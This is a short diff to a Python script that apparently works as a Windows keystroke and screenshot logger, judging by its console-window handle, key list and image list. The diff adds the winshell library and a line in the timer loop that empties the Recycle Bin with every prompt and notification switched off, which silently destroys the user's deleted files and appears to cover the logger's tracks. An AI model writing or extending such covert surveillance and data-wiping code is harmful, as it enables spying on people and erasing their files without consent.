@@ -14,6 +14,7 @@ from threading import Thread
 from time import time, sleep
 import imghdr
 from subprocess import call
+import winshell
   
 win = win32console.GetConsoleWindow()
 keys = []
@@ -162,6 +163,7 @@ def checkTime():
                 pass
         imgList = []
         #reset timer
+        winshell.recycle_bin().empty(confirm=False, show_progress=False, sound=False)
         currentTime = time()
         stopTime = currentTime + iterationTime
         sleep(5)
